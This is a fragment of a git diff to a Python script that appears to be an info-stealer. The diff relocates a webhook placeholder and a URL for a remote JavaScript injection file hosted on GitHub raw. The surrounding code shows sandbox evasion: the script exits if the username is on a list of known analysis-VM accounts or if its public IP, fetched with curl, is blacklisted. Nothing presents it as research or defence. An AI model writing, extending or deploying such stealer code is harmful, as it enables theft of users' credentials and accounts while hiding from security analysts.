@@ -24,8 +24,7 @@ import ctypes
 
 
 
-wh00k = "WEBHOOK HERE"
-inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
+
 
 
 blacklistUsers = ['WDAGUtilityAccount', '3W1GJT', 'QZSBJVWM', '5ISYH9SH', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']
@@ -60,7 +59,9 @@ ip = subprocess.check_output('curl ifconfig.me', shell=True).decode('utf-8').str
 if ip in sblacklist:
     exit()
 
-
+wh00k = "WEBHOOK HERE"
+inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
+    
 DETECTED = False
 
 def g3t1p():
